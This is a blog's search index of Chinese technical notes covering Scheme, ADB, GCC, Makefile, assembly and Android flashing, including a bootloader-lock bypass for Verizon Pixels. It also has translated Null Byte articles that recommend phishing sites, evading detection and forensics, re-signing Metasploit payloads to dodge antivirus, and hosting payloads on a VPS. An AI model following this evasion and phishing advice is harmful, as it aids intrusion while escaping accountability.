<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Scheme的五法十诫]]></title>
    <url>%2F2019%2F08%2F07%2Fscheme-commandments-and-laws%2F</url>
    <content type="text"><![CDATA[节选自《The Little Schemer》 Scheme 五法Scheme 五法之第一法 —— car 之法则基本元件 car 仅定义为针对非空列表。 Scheme 五法之第二法 —— cdr 之法则基本元件 cdr 仅定义为针对非空列表。任意非空列表的 cdr 总是另一个列表。 Scheme 五法之第三法 —— cons 之法则基本元件 cons 需要两个参数。第二个参数必须是一个列表。结果是一个列表。 Scheme 五法之第四法 —— Null? 之法则基本元件 null? 仅定义为针对列表。 Scheme 五法之第五法 —— eq? 之法则基本元件 eq? 需要两个参数。每个参数都必须是一个非数字的原子。 Scheme十诫第一诫当对一个原子列表 lat 进行递归调用时，询问两个有关 lat 的问题：(null? lat) 和 else。 当对一个数字 n 进行递归调用时，询问两个有关 n 的问题：(zero? n) 和 else。 当对一个S-表达式列表 l 进行递归调用时，询问三个有关 l 的问题：(null? lat)、(atom? (car l)) 和 else。 第二诫使用 cons 来构建列表。 第三诫构建一个列表的时候，描述第一个典型元素，之后 cons 该元素到一般性递归（natural recursion）上。 第四诫在递归时总是改变至少一个参数。当对一个原子列表 lat 进行递归调用时，使用 (cdr lat)。当对数字 n 进行递归调用时，使用 (sub1 n)。当对一个S-表达式 l 进行递归调用时，只要是 (null? l) 和 (atom? (car l)) 都不为 true，那么就同时使用 (car l) 和 (cdr l)。 在递归时改变的参数，必须向着不断接近结束条件而改变。改变的参数必须在结束条件中得以测试： 当使用 cdr 时，用 null? 测试是否结束； 当使用 sub1 时,用 zero? 测试是否结束。 第五诫当用 ➕ 构建一个值时，总是使用 0 作为结束代码行的值，因为加上 0 不会改变加法的值。 当用 ✖ 构建一个值时，总是使用 1 作为结柬代码行的值，因为乘以 1 不会改变乘法的值。 当用 cons 构建一个值时，总是考虑把 0 作为结束代码行的值。 第六诫简化工作只在功能正确之后开展。 第七诫对具有相同性质的 subparts（子部件）进行递归调用： 列表的子列表。 算术表达式的子表达式。 第八诫使用辅助函数来抽象表示方式。 第九诫用函数来抽象通用模式。 第十诫构建函数,一次收集多个值。]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ADB小记]]></title>
    <url>%2F2019%2F07%2F29%2Fadb%2F</url>
    <content type="text"><![CDATA[相关问题error: device still connecting输入adb shell时显示error: device still connecting，一般可通过：关闭开发者模式然后重新打开开发者模式，接着开启USB调试并重新和电脑配对，即可解决。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Windows的代理设置]]></title>
    <url>%2F2019%2F07%2F29%2Fabout-the-proxy-settings-for-windows%2F</url>
    <content type="text"><![CDATA[Windows的系统代理使用的其实是IE的代理设置，此外，对于绝大多数的应用程序而言，它们默认使用的也是IE的代理设置，比如，Chrome、Firefox、Microsoft Store等。因此，如果想让绝大多数的应用程序使用代理，一个简单的方法是直接设置IE的代理（即系统代理）。不过，对于一小部分没有使用IE代理设置的应用程序，比如Android Studio等，你可能需要单独设置它们的代理（一般在软件的设置项中）。 值得注意的是，同为应用程序的Shell（包括命令提示符和PowerShell）就没有使用IE的代理设置，它们各自有自己的代理设置。具体而言，要为命令提示符设置代理，可使用如下两条命令：12set HTTP_PROXY=http://user:password@proxy.domain.com:portset HTTPS_PROXY=https://user:password@proxy.domain.com:port 而要为PowerShell设置代理则要使用这个脚本。 最后，对于Shell中运行的程序，有一部分使用的是IE的代理设置，比如pip、git、npm等，另一部分则使用的是Shell的代理设置，比如curl等。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nexus/Pixel相关问题解决]]></title>
    <url>%2F2019%2F07%2F21%2Fnexus-pixel-problem%2F</url>
    <content type="text"><![CDATA[移动网络/Wifi出现叹号或叉号Captive Portal是从Android 5开始引入的一项新功能，其主要用于检测网络连接是否正常，当用户连接网络后，系统会通过HTTP访问一个Google的服务器，若返回200状态码，则表示用户可能处在一个需要登录认证的网络环境中；若返回204状态码，则表示网络连接正常；若连接超时，则表示网络连接不正常，此时网络图标会显示一个叹号或叉号。 显然，Google的服务器是连接不上的，我们可以通过修改服务器地址来解决此问题。具体而言，连接ADB，针对不同的系统版本，下方分别给出了相关命令： Android 9.0/8.1/8.0/7.1.2/7.1.1：1adb shell settings put global captive_portal_https_url https://www.google.cn/generate_204 Android 7.1/7.0：12adb shell settings delete global captive_portal_server adb shell settings put global captive_portal_detection_enabled 0 Android 5.0-6.x：1adb shell settings put global captive_portal_server www.google.cn 执行之后，开启飞行模式，接着关闭飞行模式即可。 搜索不到WiFi因为美国2.4GHz频段的WiFi信道为1-11，而中国2.4GHz频段的WiFi信道为1-13，所以当2.4GHz频段的WiFi信道位于12或13时，美版的Nexus/Pixel会搜索不到WiFi，此时可通过重启路由器，使其自动更换信道，或进入路由器设置页面，将信道改为11以内任意信道即可。 4G信号问题由于联通的网络制式一直采用的是国际通用的网络制式，所以Nexus/Pixel可以完美支持联通2G/3G/4G。 移动的3G网络制式采用的是自主研发的技术，所以Nexus/Pixel并不支持移动3G，然而移动4G网络制式采用的是自主研发和国际通用并行的方式，所以Nexus/Pixel只支持部分移动4G频段。 简单来说，Nexus/Pixel完美支持联通2G/3G/4G，支持移动2G，不支持移动3G，部分支持移动4G（具体表现为在城市有4G网络，在农村没有4G网络），电信2G/3G/4G可通过破解（本文不讨论这点）实现支持。 Google（即负一屏）无法使用接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）严格来说，这不算是Nexus/Pixel特有的问题，究其原因是距离感应器坏了，可通过设置使用电源键挂断电话，具体方法为在设置 —&gt; 辅助功能/无障碍中开启按电源按钮结束通话。 蓝牙传输失败，显示不支持此内容由于版权问题，原生Android不支持传输以.apk结尾的文件，可通过将其改为.jpg结尾传输。 Google Play商店更新应用卡住在Android 9.0之前，Play商店是通过下载管理器下载应用的，出现这种情况可以直接将下载管理器强行停止，然后重新启动Play商店即可更新应用。在Android 9.0之后，可直接将Play商店强行停止再重新启动即可。 系统无法更新具体表现为系统更新处永远显示正在安装系统更新，一般来说，这是由于网络原因引起的，目前并没有一个稳定的解决办法，建议直接下载新系统镜像并线刷。你可以在这个官方地址找到有关Nexus/Pixel的所有出厂镜像，其中也附带有详细的安装方法。 具体而言，你需要先解锁Bootloader，然后连接ADB，紧接着执行adb reboot bootloader进入fastboot模式，最后执行相应系统的flash-all脚本即可。 Pixel/Pixel XL Verizon版解锁Bootloader教程教程来源自xda上的一篇文章，具体步骤如下： 从您的设备中删除Google帐户和任何类型的屏幕锁定（指纹，PIN，图案等）。 从您的设备中取出SIM卡。 重置您的设备。在设置向导中，跳过所有内容，不要连接到WiFi，不要添加指纹或任何类型的屏幕锁定。 转到开发人员选项并启用USB调试。 将手机连接到PC。 在adb目录中打开CMD并输入：adb shell pm uninstall --user 0 com.android.phone 重启您的设备。 连接到WiFi，打开Chrome并转到google.com（或任何网站）。 转到开发人员选项并启用OEM解锁。 重启到bootloader并通过CMD运行：fastboot oem unlock或fastboot flashing unlock。 完成。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GCC小记]]></title>
    <url>%2F2019%2F04%2F18%2Fgcc%2F</url>
    <content type="text"><![CDATA[GCC一般有两层意思，大的意思是指GNU Compiler Collection（即GNU编译器套装），小的意思是指GNU C Compiler（即GNU C语言编译器），在本文中，我默认大写的GCC指大的意思，小写的gcc指小的意思。 使用gcc编译C语言源代码的一般格式如下：1$ gcc test.c -o test 常用参数Linux下gcc命令常见的参数及其含义如下所示： --help：显示帮助信息 -o：指定生成的文件名，若不指定，则默认生成a.out -E：生成.i格式的预处理文件 -S：生成.s格式的汇编文件 -c：生成.o格式的二进制文件 -save-temps：保留所有生成的中间文件 -g：生成必要的符号信息，为调试而用 -ggdb：生成可特供于gdb使用的调试信息 -gstabs：生成stabs格式的调试信息 -Wall：显示所有常用的警告信息，即Warning all -m32：指定生成32位程序 -Os：为减小代码大小而进行优化，即Optimizers small -nostdinc：不使用标准库 -fno-stack-protector：不生成用于检测缓冲区溢出的代码 -I&lt;dir&gt;：添加搜索头文件的路径 -fno-builtin：除非用__builtin_前缀，否则不进行builtin函数的优化 跨平台为了在Windows中使用GCC，诞生了MinGW 项目，即Minimalist GNU for Windows(适用于Windows的极简GNU)，它是将GCC编译器和GNU Binutils移植到Win32平台下的产物，又被称为mingw32。另有可用于产生32位及64位Windows可执行文件的MinGW-w64项目，是从原MinGW项目产生的分支。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QEMU小记]]></title>
    <url>%2F2019%2F04%2F18%2Fqemu%2F</url>
    <content type="text"><![CDATA[QEMU是Linux中使用最广的虚拟机，其便于调试的特性也适合于系统开发者。 安装使用sudo apt install qemu即可在Ubuntu中安装QEMU，安装完成后直接输入qemu来验证是否成功安装，如果出错，可再输入qemu-system-i386来验证其是否成功安装，若成功，可建立如下所示的软链接，以方便日后使用。1sudo ln -s /usr/bin/qemu-system-i386 /usr/bin/qemu 值得注意的是，QEMU的启动需要有图形界面，若未安装图形界面，则会报错：1Could not initialize SDL(No available video device) - exiting 运行使用QEMU运行一个虚拟机的命令格式为qemu [options] [disk_image]，其中disk_image即硬盘镜像文件。其常用的参数如下： -hda file：使用file作为硬盘0的镜像文件。 -m megs：设定虚拟内存为megs M字节，默认为128M字节。 -smp n：设置为有n个CPU的SMP系统。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Makefile小记]]></title>
    <url>%2F2019%2F04%2F18%2Fmakefile%2F</url>
    <content type="text"><![CDATA[Linux中使用最广的构建工具是make，而make会读取Makefile文件中的配置信息来完成构建，一个简单的Makefile文件如下所示：12345678editor : main.o text.o gcc -o editor main.o text.omain.o : main.c def.h gcc -c main.c #-c参数指定生成.o文件text.o : text.c com.h gcc -c text.cinstall : editor mv editor /usr/local 具体而言，冒号前面为target，即要生成的文件；冒号后面为dependencies，即被依赖的文件；每一个target:dependencies对的下一行为要执行的命令（注意要以Tab键起首）。当make不带参数时，默认执行第一个target。target也可以是要求make要完成的动作，执行这种target后并不能得到和target同名的文件，因此，也称做phony target（即伪target），如第7行所示。dependencies也可以为空，如常用的target为clean时，就没有依赖，只有命令，一般用于清理工作。 当输入make或make editor，即可开始构建。若editor这个target文件不存在，或者main.o、text.o这两个依赖文件被修改，都会导致make调用其下的命令gcc -o editor main.o text.o；接下来，由于引用到main.o和text.o，make会检查main.o的依赖main.c、def.h有无更新，如果有，则执行其下的命令gcc -c main.c；同理，也适用于text.o。当输入make install，make会检查install的依赖editor是否是最新，如果是，则执行其下的命令mv editor /usr/local。 注释Makefile中以#开头的均为注释。 回声正常情况下，make会打印每条命令，然后再执行，这就叫做回声。在命令的前面加上@，就可以关闭回声。由于在构建过程中，需要了解当前在执行哪条命令，所以通常只在注释和纯显示的echo命令前面加上@。 内置目标名内置目标名指示了如果某些名称作为target（目标名）出现，则具有特殊含义，常用的如下所示： .PHONY：明确声明伪目标 .SUFFIXES：消除默认后缀规则 .DELETE_ON_ERROR：如果遇到错误（或make中断）则删除目标文件 更多的内置目标名可以参考make官方手册。 变量Makefile中也可以使用变量，如下所示：123TXT = Hello Worldtest: echo $(TXT) 这类似于C语言中的宏，按照传统，变量名一般大写，使用变量时要放在$()之中。 有时，变量的值可能指向另一个变量，比如：V1 = $(V2)，这时会出现一个问题，V1的值到底在定义时扩展（静态扩展），还是在运行时扩展（动态扩展）？如果V2的值是动态变化的，这两种扩展方式的结果可能会差异很大。为了解决类似问题，Makefile一共提供了四个赋值运算符，如下所示：1234567891011VARIABLE = value# 在运行时扩展，允许递归扩展。VARIABLE := value# 在定义时扩展。VARIABLE ?= value# 只有在该变量为空时才设置值。VARIABLE += value# 将值追加到变量的尾端。 内置变量Makefile提供了一系列的内置变量，常见的如下所示： $(CC)：指向当前使用的编译器 更多的内置变量可以参考make官方手册。 自动变量判断使用条件判断，可以让make根据运行时的不同情况选择不同的执行分支。如下所示：12345ifeq ($(CC),gcc) libs=$(libs_for_gcc)else libs=$(normal_libs)endif 上面代码判断当前编译器是否为gcc，然后指定不同的库文件。其中ifeq比较参数arg1和arg2是否相同，类似的，ifneq比较参数arg1和arg2是否不相同。 除此之外，还有ifdef判断变量是否被定义，ifndef判断变量是否没有被定义。 函数Makefile中还内置了许多函数，可供调用，格式如下：123$(function arguments)# 或者$&#123;function arguments&#125; 常用的函数有： $(shell)：用来执行shell命令 $(wildcard)：用来在Makefile中，替换Bash的通配符。 $(patsubst)：用于模式匹配的替换，语法为$(patsubst &lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;) $(filter)： $(addsuffix)： $(addprefix)： $(if)： $(foreach)： $(call)：唯一一个可以用来创建新的参数化的函数，语法为$(call &lt;expression&gt;,&lt;parm1&gt;,&lt;parm2&gt;,...,&lt;parmn&gt;)，值得注意的是，call函数在处理参数时，第2个及其之后的参数中的空格会被保留，因而在向call函数提供参数时，最安全的做法是去除所有多余的空格，避免造成一些奇怪的效果。 相关示例如下：123456# shell函数用法contents := $(shell cat foo) # 将foo文件中的内容赋值给contents# call函数用法reverse = $(2) $(1)foo = $(call reverse,a,b) # 最终foo的值为b a 更多的内置函数可以参考make官方手册 引用其它的Makefile在Makefile中可以使用include关键字把别的Makefile包含进来，这很像C语言的#include，被包含的文件会原模原样的放在当前文件的包含位置。include的语法是：include &lt;filename&gt;，其中被包含的Makefile文件通常以.mk结尾。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对比几种文件共享协议]]></title>
    <url>%2F2019%2F04%2F17%2Ffile-sharing-protocol%2F</url>
    <content type="text"><![CDATA[SMBSMB全称Server Message Block（即服务器消息块），又称Common Internet File System（即网络文件共享系统），所以也常被缩写为SMB/CIFS。 FTPNFS]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android刷机指南]]></title>
    <url>%2F2019%2F03%2F23%2Fandroid-shuaji-guide%2F</url>
    <content type="text"><![CDATA[名词解释软重启与硬重启软重启（又称热重启）是指从操作系统层面上关机再开机，而硬重启（又称冷重启）是指直接关掉电源再开机。类似的，也有软（热）关机和硬（冷）关机，其区别类似于在Windows“开始”菜单中点击关机和直接关掉主机电源的区别。一般而言，软（热）关机对设备更好。 Bootloader/fastboot/RecoveryFull OTA Image与Factory Image刷机流程 提前备份必要的数据（下载的音乐、视频，QQ、微信的聊天记录，通话记录、短信、通讯录，相册等），尽量保持电量满。 恢复出厂设置（亦或，取消所有安全机制，如屏幕锁定等，并退出Google账号。）。 在开发者选项中开启USB调试。 解锁Bootloader（需要的话）。 刷入第三方Recovery，如TWRP。https://twrp.me/ 从TWRP中安装第三方ROM，顺便root。 常见问题开机无限进入TWRP碰到这种情况，你可能需要格式化Data分区。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言小记]]></title>
    <url>%2F2019%2F03%2F09%2Fassembly%2F</url>
    <content type="text"><![CDATA[汇编语言（Assembly Language，简称ASM）由汇编指令、伪指令和其他符号组成，其中汇编指令有对应的机器码，而伪指令和其他符号没有对应的机器码，仅由汇编器识别执行。 架构汇编语言是依赖底层CPU架构的，不同的CPU架构拥有不同的汇编语言，比如，常用于PC的x86汇编和常用于嵌入式设备的ARM汇编。由于x86架构又分为16位、32位、64位等，其相应的汇编也有稍许不同。本文主要以32位x86汇编为例做简要介绍。 寄存器汇编语言的大部分指令都是直接操作CPU中的寄存器的，所以有必要了解以下x86架构的CPU中常见的寄存器。 16位x86CPU中常见的寄存器有： 通用寄存器（8个）： 数据寄存器： AX：累加寄存器，Accumulator BX：基址寄存器，Base CX：计数寄存器，Count DX：数据寄存器，Data 指针寄存器： SP：堆栈指针寄存器，Stack Pointer BP：基址指针寄存器，Base Pointer 变址寄存器： SI：源变址寄存器，Source Index DI：目的变址寄存器，Destinatin Index 段寄存器： CS：代码段寄存器，Code Segment DS：数据段寄存器，Data Segment SS：堆栈段寄存器，Stack Segment ES：附加段寄存器，Extra Segment 控制寄存器： IP：指令指针寄存器，Instruction Pointer FLAGS：标志寄存器 为了保证兼容性，AX、BX、CX、DX这四个寄存器都可分为两个可独立使用的8位寄存器来用，如AX可分为AH和AL，其中AH代表高（High）8位，AL代表低（Low）8位，其他3个也是如此。 32位x86CPU在16位的基础上增加了一些寄存器，那些和原来作用相同的寄存器一般会在前面加上E，其中常见的寄存器有： 通用寄存器（8个）：EAX、EBX、ECX、EDX、ESP、EBP、ESI、EDI 段寄存器：CS、DS、SS、ES、FS、GS，增加的FS、GS和ES一样，属于附加段寄存器 指令指针寄存器：EIP 标志寄存器：EFLAGS 系统表寄存器：GDTR、LDTR、IDTR、TR 控制寄存器：CR0、CR1、CR2、CR3、CR4 调试寄存器：DR0、DR1、DR2、DR3、DR4、DR5、DR6、DR7 测试寄存器：TR0、TR1、TR2、TR3、TR4、TR5、TR6、TR7 类似的，64位又在32位的基础上增加了一些寄存器，那些和原来作用相同的寄存器一般会将前面的E改为R，其中常见的寄存器有： 通用寄存器（16个）：RAX、RBX、RCX、RDX、RSP、RBP、RSI、RDI、R8、R9、R10、R11、R12、R13、R14、R15 指令指针寄存器：RIP 标志寄存器：RFLAGS 指令常见的汇编指令如下： mov：传送指令，两个操作对象的位数应该一致，如mov eax,ebx，表示将EBX的值送入EAX中。8086CPU不支持将数据直接送入段寄存器的操作，要想实现此功能，只能用一个寄存器来进行中转。 add：加法指令，两个操作对象的位数应该一致，如add eax,ebx，表示将EAX和EBX相加，其值赋给EAX。 sub：减法指令，如sub eax,ebx，表示用EAX减EBX，其值赋给EAX。 push： pop： jmp：跳转指令，属于转移指令，如jmp 2AE3:3，表示将CS设为2AE3H，将IP设为0003H，CPU将从CS:IP（即2AE33H）处读取指令；jmp eax表示将EAX的值赋给IP，CS保持不变。 jnz：条件跳转指令，检查EFLAGS标志寄存器中的ZF位（零标志位）是否为0，若不为0，则跳转。 jz：条件跳转指令，检查EFLAGS标志寄存器中的ZF位（零标志位）是否为0，若为0，则跳转。 in：从I/O端口读取内容，如in al,21H，表示从21H端口读取内容到AL中。 out：向I/O端口写入内容，如out 21H,al，表示将AL的值写入到21H端口中。 xor：按位异或运算，即相同为0，不同为1，如xor eax,ebx，表示将EAX和EBX按位异或，其值赋给EAX。对同一个值进行异或，会使其得0，汇编中常用这种方法得到0，如xor eax,eax。 or：按位或运算，如or eax,ebx，表示将EAX和EBX按位或，其值赋给EAX。 注意：汇编指令和寄存器名称不区分大小写。 伪指令伪指令依赖于具体的汇编器，这里我们以GNU中的as汇编器（gas）为例，讲述常见的伪指令及其含义： .set：为变量设置一个值，如.set CR0_PE_ON, 0x1。 .globl或.global：设置外部链接，使其在其他文件中可被调用，如.globl start。 .code16：生成16位汇编代码。 .code32：生成32位汇编代码。 .p2align： .word： .long： 想要了解更多的伪指令可以参考gas的官方文档。 标号标号代表一个地址，类似于高级语言中的函数，在需要时可以使用跳转指令跳转到标号处执行，利用标号还可以实现死循环，如下：12spin: jmp spin 风格x86汇编语言的两大风格分别是Intel风格和AT&amp;T风格，分别被Microsoft和GNU所采用，两种风格的详细区别如下表所示： 项目 Intel风格 AT&amp;T风格 操作数顺序 目标操作数在前，如mov eax,8 源操作数在前，如movl $8,%eax 寄存器名字 原样，如mov eax,8 加%前缀，如movl $8,%eax 立即数 原样，如mov eax,8 加$前缀，如movl $8,%eax 16进制立即数 用后缀b与h分别表示二进制与十六进制，对于16进制字母开头的要加前缀0 加前缀0x 访问内存长度的表示 前缀byte ptr，word ptr，dword ptr 后缀b、w、l表示字节、字、长型 引用全局或静态变量var的值 [_var] _var 引用全局或静态变量var的地址 _var $_var 寄存器间址 [reg] (%reg) 寄存器变址寻址 [reg + _x] _x(%reg) 立即数变址寻址 [reg + 1] 1(%reg) 整数数组寻址 [eax*4 + array] _array (,%eax, 4) 注释 :注释以英文分号开头 #注释以井号开头 本文的书写风格以Intel风格为主。 内联汇编内联汇编（Inline Assembly）是指在C代码中嵌入汇编代码，显然，其语法是由具体的C编译器所决定的，这里主要以GNU中的gcc编译器为例简述其语法。 更多要了解汇编语言更多的知识，可以阅读王爽的《汇编语言》一书，这本书基于16位的8086CPU来讲解汇编，虽然处理器已过时，但思想永不褪色。 其次，Linux汇编语言开发指南，也是一篇不错的介绍文章。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[成为黑客高手的必备技能]]></title>
    <url>%2F2019%2F02%2F25%2Fhacker-essential-skills%2F</url>
    <content type="text"><![CDATA[本文翻译自https://null-byte.wonderhowto.com/how-to/essential-skills-becoming-master-hacker-0154509/ ，正文如下： 我的许多有抱负的黑客写信给我，都问同样的问题。“我需要什么技能才能成为一个好的黑客？” 由于黑客是最熟练的信息技术学科之一，因此需要广泛的IT技术和技术知识。要真正成为一名优秀的黑客，必须掌握许多技能。如果你没有我在此列出的所有技能，请不要气馁，可以将此列表作为你在不久的将来学习和掌握所需内容的起点。这是我进入这个精英IT行业的万神殿所需技能的概述列表。我将这些技能分为三类，以帮助你从一个级别转到另一个级别，更容易掌握基本技能、中级技能和无形技能，并提供了指向Null Byte相关文章的链接，供你了解。 基本技能这些是每个黑客在尝试破解之前应该知道的基础知识。一旦掌握了本节中的所有内容，就可以进入中间层。 基本的计算机技能不用说，要成为一名黑客，你需要一些基本的计算机技能。这些技能超出了创建Word文档或浏览Internet的能力。你需要能够在Windows中使用命令行，编辑注册表以及设置网络参数。 许多这些基本技能可以在像A+这样的基础计算机技能课程中获得。 网络技能你需要了解网络的基础知识，例如以下内容。 DHCP NAT 子网划分 IPv4 IPv6 公有和私有IP DNS 路由器和交换机 VLANs OSI模型 MAC寻址 ARP 由于我们经常利用这些技术，你越了解它们的工作方式，你就会越成功。请注意，我没有编写下面的两个指南，但它们非常有用，并涵盖了上面提到的一些网络基础知识。 黑客基础：两个标准的故事 一般人的网络数据包路由指南 Linux技能发展Linux技能对于成为黑客是非常关键的。我们用作黑客的几乎所有工具都是为Linux开发的，Linux为我们提供了使用Windows时没有的功能。 如果你需要提高你的Linux技能，或者你刚开始使用Linux，请查看下面我的Linux初学者系列。 针对有抱负的黑客的Linux基础知识 Wireshark或TcpdumpWireshark是使用最广泛的嗅探器/协议分析器，而tcpdump是命令行嗅探器/协议分析器。两者在分析TCP/IP流量和攻击方面都非常有用。 Wireshark和OSI模型介绍 Wireshark过滤器 虚拟化你需要熟练使用其中一个虚拟化软件包，如VirtualBox或VMWare Workstation。理想情况下，你需要一个安全的环境来练习你的黑客攻击行为，之后才能将它们带出现实世界。虚拟环境为你提供了一个安全的环境，可以在使用它们之前测试和优化你的黑客攻击。 安全概念与技术优秀的黑客了解安全概念和技术。克服安全管理员建立的障碍的唯一方法是熟悉它们。黑客必须了解诸如PKI（公钥基础架构），SSL（安全套接层），IDS（入侵检测系统），防火墙等等。 黑客初学者可以在Security+等基本安全课程中获得许多这些技能。 如何读写Snort规则来躲避IDS 无线技术为了能够破解无线，你必须首先了解它的工作原理。诸如加密算法（WEP，WPA，WPA2），四次握手和WPS之类的东西。此外，理解诸如连接和认证协议以及无线技术的法律约束等。 要开始学习，请查看以下有关无线术语和技术入门的指南，然后阅读我们的Wi-Fi黑客指南集，了解有关各种加密算法的详细信息以及每种黑客如何工作的示例。 Wi-Fi术语和技术入门 有抱负的黑客入侵Wi-Fi指南 中级技能这是事情变得有趣的地方，你真正开始感受到你作为黑客的能力。知道所有这些将允许你进入更直观的黑客攻击所有镜头 - 而不是其他一些黑客。 编写脚本如果没有编写脚本的技能，黑客将被降级为使用其他黑客工具。这限制了你的效率。每天都会有一个新工具失效，因为安全管理员提出了防御措施。 要开发自己独特的工具，你需要至少熟练掌握一种脚本语言，包括BASH shell。这些应该包括Perl，Python或Ruby之一。 针对有抱负的黑客的Perl脚本 为有抱负的黑客编写脚本，第1部分：BASH基础知识 为有抱负的黑客编写脚本，第2部分：条件语句 为有抱负的黑客编写脚本，第3部分：Windows PowerShell Metasploit中Meterpreter的黑客脚本终极列表 数据库技能如果你希望能够熟练地破解数据库，则需要了解数据库及其工作原理。这包括SQL语言。我还建议掌握一个主要的DBMS，如SQL Server，Oracle或MySQL。 入门前需要了解的术语和技术 寻找微软的SQL Server 破解SQL Server密码并拥有服务器 使用Sqlmap攻击MySQL在线数据库 使用Sqlmap从在线数据库中提取数据 Web应用程序Web应用程序可能是近年来黑客最肥沃的土壤。你对Web应用程序如何工作以及它们背后的数据库了解得越多，你就会越成功。此外，你可能需要建立自己的网站以进行网络钓鱼和其他恶意目的。 如何使用HTTrack克隆任何网站 如何将流量重定向到假网站 取证要成为好黑客，一定不要被抓住！你不能成为一名坐在牢房里5年的职业黑客。你对数字取证的了解越多，就越能避免和规避检测。 数字取证，第1部分：工具和技术 数字取证，第2部分：网络取证 数字取证，第3部分：恢复已删除的文件 数字取证，第4部分：DoSing时的逃避检测 高级TCP/IP黑客初学者必须了解TCP/IP基础知识，但要升级到中级，你必须了解TCP/IP协议栈和字段的详细信息。这些包括TCP和IP数据包中的每个字段（flags，window，df，tos，seq，ack等）如何被操纵并用于对抗受害者系统以启用中间人攻击等。 加密虽然要成为一个好的黑客不需要成为一个密码学家，但是你越了解每种密码算法的优缺点，就越有可能打败它。此外，黑客还可以利用密码学来隐藏他们的活动并逃避检测。 逆向工程通过逆向工程，你可以打开一个恶意软件并使用其他功能重新构建它。就像在软件工程中一样，没有人从头开始构建新的应用程序。几乎每个新漏洞或恶意软件都使用其他现有恶意软件中的组件。 此外，逆向工程使黑客能够利用现有漏洞并更改其签名，以便它可以绕过IDS和防病毒检测。 如何更改Metasploit有效载荷签名以避免防病毒检测 无形技能除了所有这些计算机技能外，成功的黑客还必须具备一些无形技能。这些包括以下内容。 创造性地思考黑客攻击系统总是有办法的，而且有很多方法可以实现。一个好的黑客可以创造性地思考同一个黑客的多种方法。 Null Byte的社会工程学指南 CryptoLocker：一个创新和创造性的黑客 解决问题的能力黑客总是遇到看似无法解决的问题。这就要求黑客习惯于分析性思维和解决问题。这通常要求黑客准确地诊断出问题所在，然后将问题分解为不同的组件。这是伴随着许多小时的练习而来的能力之一。 解决问题是一项必不可少的黑客技能 坚持黑客必须坚持不懈。如果你一开始失败了，请再试一次。如果再失败，请提出一种新的方法并重试。只有坚持不懈，你才能破解最安全的系统。 那么……你想成为黑客吗？ 我希望这能给你一些指导，让你了解你需要学习和掌握什么，才能提升到黑客的中级水平。在未来的一篇文章中，我将讨论你需要掌握什么才能提升到高级或大师级的黑客，所以请记着回来，我的新手黑客们！]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[白帽子VPS选购指南]]></title>
    <url>%2F2019%2F02%2F25%2Fwhitehat-vps%2F</url>
    <content type="text"><![CDATA[本文翻译自https://null-byte.wonderhowto.com/how-to/white-hats-guide-choosing-virtual-private-server-0183135/ ，正文如下： 从受信任的VPS进行网络钓鱼活动和托管Metasploit会话对于任何专业安全研究人员，渗透测试人员或白帽黑客都很重要。但是，可供选择的VPS非常有限，因为大多数提供商对任何类型的黑客都有零容忍政策，无论好坏。在研究了数十种产品之后，我们选出了5个理想的产品，非常适合Null Byte读者。首先要理解的事情是……什么是VPS？嗯，它代表虚拟专用服务器，是许多用户认为的专用或私有服务器的虚拟化形式，即使它安装在同时运行多个操作系统的物理计算机上。VPS最常用于在线托管网站。 当我们从提供商处购买VPS时，我们实际上是在一个有着许多虚拟服务器的功能强大的高性能物理机器上“租用”一个分区。每个VPS都连接到互联网，使个人客户能够使用不同的操作系统，并提供对操作系统的完全root访问权限。每个客户（或服务器管理员）独立于共享VPS公司提供的物理计算机上的其他客户运营。 不要错过：什么是白帽黑客？ 从本质上讲，虚拟专用服务器是我们可以从世界上任何连接互联网的设备远程控制的计算机。这给了我们很大的能力。对于远程服务器而言，下面是它可以完成的一些事情： 创建VPN连接 托管网络钓鱼站点 进行暴力攻击 创建IRC机器人 服务器代理 托管有效载荷 使用端口扫描器 创建蜜罐 托管Metasploit会话 为了做到这一点，从我们的研究来看，BulletShield是迄今为止最好的白帽和渗透测试人员的VPS提供商，紧随其后的是BuyVM和ClientVPS。亚军是VPSDime和OneHost Cloud。你可以在下面的图表中看到原因，但跳到下面可以深入研究每个比较点的含义。 关键比较点网上有几个VPS对比图表，但没有一个对我来说是与渗透测试人员和白帽子有所联系的。在大多数专业的渗透测试场景中，我们需要在几天内启动VPS来托管有效载荷，接收泄漏数据或执行网络钓鱼攻击。 无论VPS提供商是否提供实时技术支持，难以理解的硬件规格或过多的操作系统选择都很重要。理想情况下，我们希望使用比特币（BTC）从位于尊重隐私的国家的VPS提供商处快速购买最新的Debian版本。 在比较本文中介绍的VPS提供商时，我试图尽可能客观公正。本文中没有VPS提供商付费参与比较图表。我使用下面的标准来得出上面的图表。 不要错过：如何在比特币和以太坊中出售你的Stellar，Ripple和其他替代币？ 最好的价钱（Best 